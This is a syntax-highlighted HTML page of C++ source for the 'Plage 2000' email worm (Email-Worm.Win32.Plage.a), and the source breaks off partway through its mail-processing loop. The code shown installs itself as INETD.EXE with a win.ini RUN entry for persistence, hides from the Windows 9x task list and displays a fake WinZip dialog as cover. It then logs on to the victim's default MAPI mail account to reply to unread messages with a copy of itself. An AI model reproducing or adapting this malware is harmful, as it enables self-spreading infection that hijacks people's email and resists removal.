<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Plage.a - WORM.CPP.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*

    Plage 2000
    Coded by Bumblebee/29a

    Another worm?
    -------------

    This is Plage 2000. You can see what is the real plage of 2000: just look the
    payload. If you feel offended by it then FUCK YOU! This is not intolerance or
    hate. Only one thing: i'm not agree with inhumanity.

    I know, i know. Anoher worm. But it's so nice! This is the first seriuos
    worm i code in C++ (oh, +- it's really C). It works similar to another well
    known worm: I-Worm.ZippedFiles. I haven't seen its source, but the AVP
    description makes me think so.

    Replies the unreaded mails found in the default account after log in. Marks
    the replied mail with two spaces at the end of the subject. Notice that the
    reply has this mark too. Due to this i avoid to re-send worm. Makes use of
    the different levels of priority during execution to enhance performance.
    Selects between 16 different names for the attachment, but the body of the
    message it's so static :(

    The worm does some stealth tickz:

            - Shows a WinZip Self-Extractor dialog after installation
            - Hides itself from task list with documented method (win9x only)

    I tried to do it harder to remove for the user than most worms (win9x).


                                                            The way of the bee
*/</span><span class="sc0">
</span><span class="sc9">#include&lt;windows.h&gt;
#include&lt;mapi.h&gt;
#include&lt;memory.h&gt;
</span><span class="sc0">
</span><span class="sc9">#include"res.rh"
</span><span class="sc0">
</span><span class="sc2">// API form MAPI32 use by the worm
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MLogon</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPLHANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MFindNext</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MReadMail</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpMapiMessage</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSaveMail</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpMapiMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MFreeBuffer</span><span class="sc10">)(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">// for task list stealth under win9x
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">RegisterServiceProcess</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0"> </span><span class="sc11">MDialogProc</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WPARAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPARAM</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0"> </span><span class="sc11">MDialogProcPay</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WPARAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPARAM</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0"> </span><span class="sc11">MDialogProcPayPaint</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WPARAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPARAM</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fake</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">fake</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc2">// fake function
</span><span class="sc11">HBITMAP</span><span class="sc0"> </span><span class="sc11">bmp</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// for the payload
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">


</span><span class="sc9">#pragma argsused
</span><span class="sc2">// main
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0">
</span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">syst</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// for payload
</span><span class="sc0">  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">   </span><span class="sc2">// erm...
</span><span class="sc0">  </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">MAPIlHnd</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// to manage MAPI32.DLL
</span><span class="sc0">  </span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// to manage the session login
</span><span class="sc0">  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">messId</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">   </span><span class="sc2">// to store messages identifiers
</span><span class="sc0">  </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mess</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// to store the mails we read
</span><span class="sc0">  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc0">
       </span><span class="sc11">address</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc0">
          </span><span class="sc11">body</span><span class="sc10">[</span><span class="sc4">8192</span><span class="sc10">],</span><span class="sc0">
        </span><span class="sc11">server</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc2">// to manage... guess!
</span><span class="sc0">  </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc2">// to do some loops
</span><span class="sc0">  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmp</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">// neded at sending mail time
</span><span class="sc0">  </span><span class="sc11">MSG</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// to process messages
</span><span class="sc0">

  </span><span class="sc11">fileName</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc2">// get module name for the attachment, the stealth and residence
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc4">512</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc11">DialogBox</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc6">"UNZIP"</span><span class="sc10">,(</span><span class="sc11">HWND</span><span class="sc10">)</span><span class="sc5">NULL</span><span class="sc10">,(</span><span class="sc11">DLGPROC</span><span class="sc10">)</span><span class="sc11">MDialogProc</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">128</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"%s\\INETD.EXE"</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">strcmpi</span><span class="sc10">(</span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc6">"Install me!"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmpi</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">// install into system
</span><span class="sc0">        </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc6">"WINDOWS"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RUN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// do stealth (if not forced installation)
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">DialogBox</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc6">"UNZIP"</span><span class="sc10">,(</span><span class="sc11">HWND</span><span class="sc10">)</span><span class="sc5">NULL</span><span class="sc10">,(</span><span class="sc11">DLGPROC</span><span class="sc10">)</span><span class="sc11">MDialogProc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc2">// at this point the worm know it's installed yet
</span><span class="sc0">  </span><span class="sc2">// avoid multiple instances of worm running at the same time
</span><span class="sc0">  </span><span class="sc2">// (this works under NT or hPrevInstance is ever NULL?)
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hPrevInstance</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// try to hide the process in the task list
</span><span class="sc0">  </span><span class="sc2">// this will work only in win9x 'cause NT doesn't exports
</span><span class="sc0">  </span><span class="sc2">// 'RegisterServiceProcess' API
</span><span class="sc0">  </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">k32</span><span class="sc10">=</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">RegisterServiceProcess</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">,</span><span class="sc6">"RegisterServiceProcess"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegisterServiceProcess</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">RegisterServiceProcess</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc2">// check date
</span><span class="sc0">  </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">syst</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wDayOfWeek</span><span class="sc10">==</span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wHour</span><span class="sc10">&lt;</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">// get the bitmap from resource
</span><span class="sc0">        </span><span class="sc11">bmp</span><span class="sc10">=</span><span class="sc11">LoadBitmap</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc6">"FOLLOW"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// show the payload dialog
</span><span class="sc0">        </span><span class="sc11">DialogBox</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc6">"PLAGE"</span><span class="sc10">,(</span><span class="sc11">HWND</span><span class="sc10">)</span><span class="sc5">NULL</span><span class="sc10">,(</span><span class="sc11">DLGPROC</span><span class="sc10">)</span><span class="sc11">MDialogProcPay</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">DeleteObject</span><span class="sc10">(</span><span class="sc11">bmp</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// continue execution: User should try to remove the worm:
</span><span class="sc0">        </span><span class="sc2">// make it harder... from Winblows only can erase win.ini line
</span><span class="sc0">        </span><span class="sc2">// while the worm is running (cannot stop it if task list stealth
</span><span class="sc0">        </span><span class="sc2">// works). The worm restores this line when user closes the system
</span><span class="sc0">        </span><span class="sc2">// juajua.
</span><span class="sc0">  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc2">// sleep five minutes before act
</span><span class="sc0">  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">60000</span><span class="sc10">*</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc2">// load MAIP32.DLL
</span><span class="sc0">  </span><span class="sc11">MAPIlHnd</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// try to load MAPI32.DLL
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MAPIlHnd</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// get MAPILogon
</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MLogon</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MLogon</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// get MAPIFindNext
</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MFindNext</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFindNext"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MFindNext</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// get MAPIReadMail
</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MReadMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIReadMail"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MReadMail</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// get MAPIFreeBuffer
</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MFreeBuffer</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFreeBuffer"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MFreeBuffer</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// get MAPISendMail
</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MSendMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MSendMail</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// get MAPISaveMail
</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MSaveMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISaveMail"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MSaveMail</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// 1st logon the default account
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MLogon</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_USE_DEFAULT</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">session</span><span class="sc10">)!=</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc2">// 2nd find unread messages identifiers
</span><span class="sc0">  </span><span class="sc2">// this is the infinite loop of the worm (while message!=WM_QUIT)
</span><span class="sc0">  </span><span class="sc2">// run with lowest priority while not messages into inbox
</span><span class="sc0">  </span><span class="sc11">SetThreadPriority</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">THREAD_PRIORITY_LOWEST</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">GetMessage</span><span class="sc10">(&amp;</span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">|</span><span class="sc11">MAPI_UNREAD_ONLY</span><span class="sc0">
            </span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// 3rd read minium of message and test checked mark
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MReadMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_ENVELOPE_ONLY</span><span class="sc10">|</span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">mess</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// we want a subject of at least 2 chars
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">)&gt;</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc2">// test the checked mark
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc7">' '</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                        </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">)-</span><span class="sc4">2</span><span class="sc10">]!=</span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">MFreeBuffer</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc2">// Do it fast!
</span><span class="sc0">                        </span><span class="sc11">SetThreadPriority</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">THREAD_PRIORITY_HIGHEST</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc2">// read all the message and process it
